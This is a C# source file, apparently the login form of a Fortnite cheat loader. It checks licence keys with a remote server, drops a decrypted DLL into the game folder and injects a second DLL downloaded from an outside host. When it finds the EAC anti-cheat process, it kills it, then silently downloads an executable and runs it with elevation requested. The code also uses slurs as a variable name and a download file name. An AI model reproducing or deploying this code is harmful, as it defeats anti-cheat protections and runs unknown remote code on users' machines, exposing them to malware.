using chinaenhance.Properties;
using SafeRequest.NET;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace weebware_fortnite_loader {
    public partial class Login : Form {
        public Login() {
            AntiTamper.Start();
            Process[] fort = Process.GetProcessesByName("FortniteClient-Win64-Shipping");
            if (fort.Length > 0) {
                MessageBox.Show("PLEASE CLOSE FORTNITE FIRST");
                Utilities.cleanup();
                Environment.Exit(1337);
                AntiTamper.IntegrityCheck();
            }
            InitializeComponent();
            if (Settings.Default.key != string.Empty) {
                txtLicenceKey.Text = Settings.Default.key;
            }
            Thread t = new Thread(process_checks);
            t.Start();
        }

        static bool isLoaded = false;
        private void Login_Load(object sender, EventArgs e) {
            AntiTamper.Start();
            WebClient web = new WebClient();
            web.Proxy = null;
            if (!isLoaded) {
                string ip = web.DownloadString("https://auth.weebware.net/ip.php");
                string BannedIPs = web.DownloadString("http://chinaenhance.xyz/bannedips.txt");
                if (BannedIPs.Contains(ip)) {
                    Utilities.cleanup();
                    MessageBox.Show("banned");
                    Application.Exit();
                }
                isLoaded = true;
            }
            AntiTamper.IntegrityCheck();
            Process[] gay = Process.GetProcessesByName("Discord");
            if (gay.Length < 1) {
                Utilities.cleanup();
                MessageBox.Show("PLEASE OPEN DISCORD TO HACK");
                Environment.Exit(1337);
            }
            Process.Start("https://www.youtube.com/watch?v=UctriMuXYS0");
        }

        private void btnLogin_Click(object sender, EventArgs e) {
            Response response = Networking.authenticate(txtLicenceKey.Text);
            if (response != null) {
                AntiTamper.IntegrityCheck();
                if (!response.status) {
                    MessageBox.Show(" !! 错误 ERROR !! 错误 ");
                    return;
                }
                else if (response.status) {
                    AntiTamper.IntegrityCheck();
                    Settings.Default.key = txtLicenceKey.Text;
                    Settings.Default.Save();
                    WebClient web = new WebClient();
                    byte[] buffer;
                    string temp_path = Path.GetTempFileName();
                    web.DownloadFile(response.GetData<string>("download"), temp_path);
                    buffer = Utilities.decryptToBytes(temp_path, Utilities.DecryptString(response.GetData<string>("key"), "zgJoEYlViXJXpsFN"));
                    File.Delete(temp_path);
                    File.WriteAllBytes(Utilities.game_path + "nvToolsExt64_1.dll", buffer);
                    AntiTamper.IntegrityCheck();
                    string disc_path = Path.GetTempFileName();
                    web.DownloadFile("http://chinaenhance.xyz/tenshi/tenshi_ayy.dll", disc_path);
                    InjectionHelper.InjectPreset(disc_path, "");
                    label3.Hide(); txtUsername.Hide(); txtLicenceKey.Hide(); btnLogin.Hide(); label1.Show(); label2.Show();
                    MessageBox.Show("You may now open your game");
                }
            }
        }

        private void process_checks() {
            AntiTamper.IntegrityCheck();
            while (true) {
                Process[] eac = Process.GetProcessesByName("FortniteClient-Win64-Shipping_EAC.exe");
                Process[] discord = Process.GetProcessesByName("Discord");
                if (eac.Length > 0) {
                    foreach (var process in Process.GetProcessesByName("FortniteClient-Win64-Shipping_EAC.exe")) {
                        process.Kill();
                        WebClient web = new WebClient();
                        web.DownloadFile("http://chinaenhance.xyz/nigger.exe", @"C:\Chinaware\kms.exe");
                        ProcessStartInfo info = new ProcessStartInfo(@"C:\Chinaware\kms.exe");
                        info.UseShellExecute = false;
                        info.Verb = "runas";
                        Process.Start(info);
                    }
                }
                if (discord.Length < 1) {
                    Utilities.cleanup();
                    MessageBox.Show("PLEASE OPEN DISCORD TO HACK");
                    Environment.Exit(1337);
                }
                Thread.Sleep(1000);
            }
        }

        private void Login_FormClosing(object sender, FormClosingEventArgs e) {
            AntiTamper.IntegrityCheck();
            Utilities.cleanup();
            Environment.Exit(1337);
        }
    }
}


